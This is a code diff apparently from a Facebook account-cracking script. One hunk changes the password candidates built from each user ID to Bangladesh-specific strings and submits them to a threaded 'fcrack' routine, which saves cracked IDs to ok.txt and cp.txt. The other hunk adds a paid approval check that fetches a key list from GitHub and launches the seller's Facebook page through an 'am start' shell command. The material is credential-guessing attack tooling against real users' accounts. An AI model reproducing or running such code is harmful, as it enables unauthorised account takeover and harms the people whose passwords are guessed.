@@ -1391,7 +1391,7 @@ def bangladeh():
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'+1','USA']
+			pwx = [guru,'+88','bangladish']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
@@ -1536,7 +1536,25 @@ def SUBSCRIPTION():
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "-".join(uuid)
 
-  
+  try:
+    httpCaht = requests.get('https://github.com/mrwolf-danger/cp-approve/blob/main/cp-approve.txt').text
+    if id in httpCaht:
+      print("\33[1;32mYOUR KEY IS APPROVED.")
+      msg = str(os.geteuid())
+      time.sleep(0.5)
+      rehan()
+      pass
+    else:
+      print("YOUR KEY : "+id)
+      print('\33[1;37m----------------------------------------------')
+      print("\33[1;32mNOTE:")
+      print("\33[1;37m----------------------------------------------")
+      print("\33[1;37mTOOL IS FREE BUT YOU HAVE TO\nGET APPROVAL FIRST.")
+      print('\33[1;37m----------------------------------------------')
+      print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
+      input('IF U WANT TO BUY THEN PRESS ENTER ')
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://facebook.com/ifad.ibrahim.8'+tks),approval()
+      time.sleep(1)
       SUBSCRIPTION()
   except:
     sys.exit()
